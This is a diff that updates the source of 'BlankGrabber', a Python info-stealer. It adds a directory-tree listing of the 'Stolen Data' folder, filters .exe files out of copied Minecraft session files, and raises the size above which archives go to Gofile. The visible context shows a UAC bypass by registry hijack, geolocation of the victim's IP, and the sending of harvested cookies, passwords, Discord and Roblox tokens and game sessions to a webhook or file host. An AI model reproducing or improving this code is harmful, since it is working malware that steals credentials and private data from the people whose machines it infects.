@@ -186,6 +186,51 @@ class Utility:
         return passwords
     
     @staticmethod
+    def Tree(path: str | tuple, prefix: str = ""):
+        def GetSize(_path: str) -> int:
+            size = 0
+            if os.path.isfile(_path):
+                size += os.path.getsize(_path)
+            elif os.path.isdir(_path):
+                for root, dirs, files in os.walk(_path):
+                    for file in files:
+                        size += os.path.getsize(os.path.join(root, file))
+                    for _dir in dirs:
+                        size += GetSize(os.path.join(root, _dir))
+        
+            return size
+        
+        DIRICON   = chr(128194) + " - "
+        FILEICON  = chr(128196) + " - "
+        EMPTY     = "    "
+        PIPE      = chr(9474) + "   "
+        TEE       = "".join(chr(x) for x in (9500, 9472, 9472)) + " "
+        ELBOW     = "".join(chr(x) for x in (9492, 9472, 9472)) + " "
+
+        if prefix == "":
+            if isinstance(path, str):
+                yield DIRICON + os.path.basename(os.path.abspath(path))
+            elif isinstance(path, tuple):
+                yield DIRICON + path[1]
+                path = path[0]
+        
+        contents = os.listdir(path)
+        folders = (os.path.join(path, x) for x in contents if os.path.isdir(os.path.join(path, x)))
+        files = (os.path.join(path, x) for x in contents if os.path.isfile(os.path.join(path, x)))
+
+        body = [TEE for _ in range(len(os.listdir(path)) - 1)] + [ELBOW]
+        count = 0
+
+        for item in folders:
+            yield prefix + body[count] + DIRICON + os.path.basename(item) + " (%d items, %.2f KB)" % (len(os.listdir(item)), GetSize(item)/1024)
+            yield from Utility.Tree(item, prefix + (EMPTY if count == len(body) - 1 else PIPE) if prefix else PIPE)
+            count += 1
+        
+        for item in files:
+            yield prefix + body[count] + FILEICON + os.path.basename(item) + " (%.2f KB)" % (GetSize(item)/1024)
+            count += 1
+    
+    @staticmethod
     def IsAdmin() -> bool:
         return subprocess.run("net session", shell= True, capture_output= True).returncode == 0
     
@@ -194,7 +239,7 @@ class Utility:
         if not hasattr(sys, "frozen"):
             return
         
-        def execute(cmd: str): return subprocess.run(cmd, shell= True, capture_output= True).returncode == 0
+        execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True).returncode == 0
         
         if method == 1:
             if not execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f"): Utility.UACbypass(2)
@@ -804,6 +849,7 @@ class BlankGrabber:
         if Errors.errors:
             with open(os.path.join(self.TempFolder, "Errors.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                 file.write("# This file contains the errors handled successfully during the functioning of the stealer." + "\n\n" + "=" * 50 + "\n\n" + ("\n\n" + "=" * 50 + "\n\n").join(Errors.errors))
+        self.GenerateTree()
         self.SendData()
         try:
             os.remove(self.ArchivePath)
@@ -819,12 +865,13 @@ class BlankGrabber:
 
             if any([os.path.isfile(os.path.join(minecraftDir, filename)) for filename in ("launcher_profiles.json", "launcher_accounts_microsoft_store.json")]):
                 for name in os.listdir(minecraftDir):
-                    filePath = os.path.join(minecraftDir, name)
-                    copyTo = os.path.join(copyToDir, name)
+                    if not name.endswith((".exe",)):
+                        filePath = os.path.join(minecraftDir, name)
+                        copyTo = os.path.join(copyToDir, name)
 
-                    if os.path.isfile(filePath):
-                        os.makedirs(copyToDir, exist_ok= True)
-                        shutil.copy(filePath, copyTo)
+                        if os.path.isfile(filePath):
+                            os.makedirs(copyToDir, exist_ok= True)
+                            shutil.copy(filePath, copyTo)
                 
                 self.MinecraftSessions += 1
     
@@ -873,6 +920,11 @@ class BlankGrabber:
         
     @Errors.Catch
     def GetDirectoryTree(self) -> None:
+
+        PIPE      = chr(9474) + "   "
+        TEE       = "".join(chr(x) for x in (9500, 9472, 9472)) + " "
+        ELBOW     = "".join(chr(x) for x in (9492, 9472, 9472)) + " "
+        
         if Settings.CaptureSystemInfo:
             output = {}
             for location in ['Desktop', 'Documents' , 'Downloads', 'Music', 'Pictures', 'Videos']:
@@ -885,7 +937,7 @@ class BlankGrabber:
                 if dircontent:
                     process = subprocess.run("tree /A /F", shell= True, capture_output= True, cwd= location)
                     if process.returncode == 0:
-                        output[os.path.split(location)[-1]] = os.path.basename(location) + "\n" + "\n".join(process.stdout.decode(errors= "ignore").splitlines()[3:])
+                        output[os.path.split(location)[-1]] = (os.path.basename(location) + "\n" + "\n".join(process.stdout.decode(errors= "ignore").splitlines()[3:])).replace("|   ", PIPE).replace("+---", TEE).replace("\---", ELBOW)
 
             for key, value in output.items():
                 os.makedirs(os.path.join(self.TempFolder, "Directories"), exist_ok= True)
@@ -1170,6 +1222,15 @@ class BlankGrabber:
         
         shutil.make_archive(self.ArchivePath.rsplit(".", 1)[0], "zip", self.TempFolder)
         return ("zip", None)
+
+    def GenerateTree(self) -> None:
+        if os.path.isdir(self.TempFolder):
+            try:
+                contents = "\n".join(Utility.Tree((self.TempFolder, "Stolen Data")))
+                with open(os.path.join(self.TempFolder, "Tree.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
+                    file.write(contents)
+            except Exception:
+                pass
     
     def UploadToGofile(self, path, filename= None) -> str | None:
         if os.path.isfile(path):
@@ -1190,7 +1251,7 @@ class BlankGrabber:
                 pass
 
     def SendData(self) -> None:
-        format, password = self.CreateArchive()
+        extention, password = self.CreateArchive()
         if (self.Cookies or self.Passwords or self.RobloxCookies or self.DiscordTokens or self.MinecraftSessions) and os.path.isfile(self.ArchivePath):
             computerName = os.getenv("computername")
             computerOS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()[2].strip()
@@ -1203,7 +1264,7 @@ class BlankGrabber:
             http = PoolManager()
 
             try:
-                r = json.loads(http.request("GET", "http://ip-api.com/json/?fields=225545").data.decode())
+                r: dict = json.loads(http.request("GET", "http://ip-api.com/json/?fields=225545").data.decode())
                 if r.get("status") != "success":
                     raise Exception("Failed")
                 data = f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
@@ -1252,9 +1313,9 @@ class BlankGrabber:
   "avatar_url" : image_url
 }
 
-            filename = "Blank-{}.{}".format(os.getlogin(), format)
+            filename = "Blank-{}.{}".format(os.getlogin(), extention)
 
-            if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 5:
+            if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20: # Max upload size is 25 MB
                 url = self.UploadToGofile(self.ArchivePath, filename)
             else:
                 url = None
